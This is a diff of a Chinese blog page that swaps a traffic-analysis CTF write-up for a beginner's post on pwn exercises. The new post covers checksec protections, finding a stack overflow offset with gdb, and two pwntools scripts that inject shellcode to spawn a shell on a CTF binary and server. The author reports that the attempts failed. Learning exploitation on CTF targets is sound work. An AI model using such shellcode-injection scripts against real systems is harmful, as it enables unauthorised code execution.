@@ -15,22 +15,28 @@
 
 
 
-<meta name="description" content="Misc shell题目描述流量分析。如果你解不出flag，请先查看整个流量，搞清楚网络中的两台主机之间发生了什么。">
+<meta name="description" content="oj pwn-bof搭建好环境，也看了很多关于pwn的博客，就开始练练手吧，毕竟理论和实际操作还是有差别的。">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Misc shell">
-<meta property="og:url" content="https://hanqd.github.io/2019/04/04/Misc shell/index.html">
+<meta property="og:title" content="pwn题目初尝试">
+<meta property="og:url" content="https://hanqd.github.io/2019/04/10/oj pwn/index.html">
 <meta property="og:site_name" content="HANqd&#39;s BLOG">
-<meta property="og:description" content="Misc shell题目描述流量分析。如果你解不出flag，请先查看整个流量，搞清楚网络中的两台主机之间发生了什么。">
+<meta property="og:description" content="oj pwn-bof搭建好环境，也看了很多关于pwn的博客，就开始练练手吧，毕竟理论和实际操作还是有差别的。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/25.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/27.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/26.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/28.PNG">
-<meta property="og:updated_time" content="2019-04-04T14:59:54.243Z">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/36.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/43.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/35.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/37.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/38.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/39.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/40.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/42.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/42.PNG">
+<meta property="og:updated_time" content="2019-04-10T14:40:53.915Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Misc shell">
-<meta name="twitter:description" content="Misc shell题目描述流量分析。如果你解不出flag，请先查看整个流量，搞清楚网络中的两台主机之间发生了什么。">
-<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/25.PNG">
+<meta name="twitter:title" content="pwn题目初尝试">
+<meta name="twitter:description" content="oj pwn-bof搭建好环境，也看了很多关于pwn的博客，就开始练练手吧，毕竟理论和实际操作还是有差别的。">
+<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/36.PNG">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -62,7 +68,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Misc shell | HANqd&#39;s BLOG</title>
+<title>pwn题目初尝试 | HANqd&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -272,11 +278,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-Misc shell" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-oj pwn" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/04/04/Misc shell/" class="article-date">
-      <time datetime="2019-04-04T14:58:37.561Z" itemprop="datePublished">2019-04-04</time>
+      <a href="/2019/04/10/oj pwn/" class="article-date">
+      <time datetime="2019-04-10T14:39:27.968Z" itemprop="datePublished">2019-04-10</time>
 </a>
 
 
@@ -291,7 +297,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Misc shell
+      pwn题目初尝试
     </h1>
   
 
@@ -301,6 +307,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -308,17 +318,36 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="Misc-shell"><a href="#Misc-shell" class="headerlink" title="Misc shell"></a>Misc shell</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>流量分析。如果你解不出flag，请先查看整个流量，搞清楚网络中的两台主机之间发生了什么。<br><a id="more"></a></p>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>根据题目提示，是一道流量分析题，用wireshark打开文件，如下<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/25.PNG" alt><br>题目提示，查看整个流量，那么通过过滤协议，一条条分析协议的方法是不对的，可以用跟踪数据流的方法，查看两台主机之间发生了什么。</p>
-<ol>
-<li>跟踪http流：鼠标放在http协议上，右键-》追踪流-》http流，无可疑信息。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/27.PNG" alt></li>
-<li>跟踪tcp流：方法同上，发现有flag.txt和base64字样，再往下看，有一串可疑字符串（猜测使用base64编码过的）。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/26.PNG" alt></li>
-<li>Python中的swapcase()函数是对字符串的大小写进行转换。分析这个字符串是先进行base64编码，再对编码后的字符串进行大小写转换，逆过程即可得到flag。<ul>
-<li>对字符串进行大小写转换</li>
-<li>对转换后的字符串base64解码<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/28.PNG" alt></li>
+        <h2 id="oj-pwn-bof"><a href="#oj-pwn-bof" class="headerlink" title="oj pwn-bof"></a>oj pwn-bof</h2><p>搭建好环境，也看了很多关于pwn的博客，就开始练练手吧，毕竟理论和实际操作还是有差别的。<br><a id="more"></a></p>
+<h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><p>二进制保护检测工具——checksec。<br>里边的参数解释：</p>
+<ul>
+<li>Arch，该项位程序的位数，显示位32位程序。</li>
+<li>RELRO，RELRO会有Partial RELRO和FULL RELRO，如果开启了FULL RELRO，那么我们将无法修改got表，关于got表后面的文章遇到了再讲解。</li>
+<li>Stack，栈中是否开启了Canary found，如果该项保护被打开那么我们将无法直接覆盖EIP让程序任意跳转，因为在跳转后将会进行cookie校验，该项保护是可以绕过的，遇到的时候将详细分析。</li>
+<li>NX，该项表示堆栈是否可执行，如果开启了该项保护，那么我们的shellcode将不能被执行。</li>
+<li>PIE，该项表示地址随机化保护，如果开启了该项那么程序每次运行的地址都会变化，如果未开启那么No PIE（0x8048000）括号内的代表程序基址。</li>
 </ul>
+<h3 id="查看rof文件信息-：file-文件名"><a href="#查看rof文件信息-：file-文件名" class="headerlink" title="查看rof文件信息 ：file 文件名"></a>查看rof文件信息 ：file 文件名</h3><p><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/36.PNG" alt><br>是32位的，用IDA 32位的把文件打开<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/43.PNG" alt></p>
+<h3 id="查看保护机制"><a href="#查看保护机制" class="headerlink" title="查看保护机制"></a>查看保护机制</h3><p><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/35.PNG" alt><br>没开任何保护，可以进行常规操作啦。</p>
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>把文件bof拖到Ubuntu里，在终端用命令行运行（./pwn），输入很多a，出现如下错误，说明产生了溢出。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/37.PNG" alt></p>
+<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><ol>
+<li>找offset,用gdb进行调试，查看刚好输入多少位才能覆盖返回地址。</li>
+<li>返回地址这需要构造什么内容，如果没有保护直接写shellcode，拿到shell,如果在程序中有system，则在IDA中按Alt+T查找有没有“/bin/sh”字符串，如果有，则直接找到其地址，即可构造内容，没有则需要自己写shellcode。</li>
+</ol>
+<p>我在做这道题时，进行第一步就卡住了，用gdb运行程序出错，如下<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/38.PNG" alt><br>于是手动算位数，需要’a’*0x1c+’a’*4,需要32位才能刚好覆盖返回地址（这里根据在IDA看到的buf空间算出来的位数可能不对，这里先试一下。）<br>有了需要覆盖的内容位数，在来找shell的返回地址，看到bof中有system函数，但是没有“/bin/sh”字符串，需要构造shellcode.</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=remote('pwn1.blue-whale.me',9990)</span></span><br><span class="line">r=process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">address = <span class="number">0x080483F0</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">32</span>-len(shellcode))+ p32(address)+shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>但是攻击失败。。。。。</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>前面步骤同上，在此略去。</p>
+<h3 id="进入gdb调试"><a href="#进入gdb调试" class="headerlink" title="进入gdb调试"></a>进入gdb调试</h3><ol>
+<li>首先用cyclic命令产生长度很长的字符串，这里长度是200，可自己设置。</li>
+<li>进入gdb调试<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/39.PNG" alt></li>
+<li>把上面产生的字符串输入进去<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/40.PNG" alt></li>
+<li>出现寄存器的内容和PC地址<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/42.PNG" alt></li>
+<li>查看覆盖长度<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/42.PNG" alt><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote (<span class="string">"pwn1.blue-whale.me"</span>,<span class="number">9992</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">text = r.recvline()[<span class="number">17</span>: <span class="number">-2</span>]</span><br><span class="line">buf_addr=int(text,<span class="number">16</span>)</span><br><span class="line">payload=shellcode+<span class="string">'a'</span>*(<span class="number">32</span>-len(shellcode))+p32(buf_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我觉得这个题出错点有二：<br>一是可能覆盖位数算错了<br>二是shellcode注入的地址有误<br>做pwn题还是得多练习，多找思路，多借助工具，可能事半功倍。<br>争取明天做出来！</p>
+<h3 id="今日所做"><a href="#今日所做" class="headerlink" title="今日所做"></a>今日所做</h3><p>边做题边看了很多pwn的博客，还有pwn的writeup，做了第一道bof和shellcode那道，shellcode题用了题目给出的网址和端口号，可能服务器被墙了，导致连接端口失败。</p>
 
       
     </div>
@@ -327,13 +356,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/04/04/Misc shell/">Misc shell</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/10/oj pwn/">pwn题目初尝试</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
-        <p><span>发布时间:</span>2019-04-04, 22:58:37</p>
-        <p><span>最后更新:</span>2019-04-04, 22:59:54</p>
+        <p><span>发布时间:</span>2019-04-10, 22:39:27</p>
+        <p><span>最后更新:</span>2019-04-10, 22:40:53</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/04/04/Misc shell/" title="Misc shell">https://hanqd.github.io/2019/04/04/Misc shell/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/04/Misc shell/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/10/oj pwn/" title="pwn题目初尝试">https://hanqd.github.io/2019/04/10/oj pwn/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/10/oj pwn/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -345,16 +374,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/04/05/每日一题1011 1012 1013/">
-                    每日一题 1011+1012+1013
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/04/02/每日一题1010/">
-                    每日一题 1010
+                <a href="/2019/04/09/pwn环境搭建/">
+                    pwn环境搭建（Ubuntu下）
                 </a>
             </div>
         
@@ -366,7 +389,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-shell"><span class="toc-number">1.</span> <span class="toc-text">Misc shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#oj-pwn-bof"><span class="toc-number">1.</span> <span class="toc-text">oj pwn-bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#知识准备"><span class="toc-number">1.1.</span> <span class="toc-text">知识准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看rof文件信息-：file-文件名"><span class="toc-number">1.2.</span> <span class="toc-text">查看rof文件信息 ：file 文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看保护机制"><span class="toc-number">1.3.</span> <span class="toc-text">查看保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行程序"><span class="toc-number">1.4.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析代码"><span class="toc-number">1.5.</span> <span class="toc-text">分析代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本"><span class="toc-number">1.6.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-number">2.</span> <span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进入gdb调试"><span class="toc-number">2.1.</span> <span class="toc-text">进入gdb调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本-1"><span class="toc-number">2.2.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">2.3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#今日所做"><span class="toc-number">2.4.</span> <span class="toc-text">今日所做</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -402,7 +425,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Misc shell　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pwn题目初尝试　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -418,7 +441,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box"></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2019/04/04/Misc shell/" data-title="Misc shell" data-url="https://hanqd.github.io/2019/04/04/Misc shell/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/04/10/oj pwn/" data-title="pwn题目初尝试" data-url="https://hanqd.github.io/2019/04/10/oj pwn/"></div>
     <script>
         var duoshuoQuery = {short_name:""};
         var loadComment = function(){
@@ -441,15 +464,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/04/05/每日一题1011 1012 1013/" title="上一篇: 每日一题 1011+1012+1013">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/04/02/每日一题1010/" title="下一篇: 每日一题 1010">
+            <a href="/2019/04/09/pwn环境搭建/" title="下一篇: pwn环境搭建（Ubuntu下）">
                 <i class="fa fa-angle-right"></i>
             </a>
         
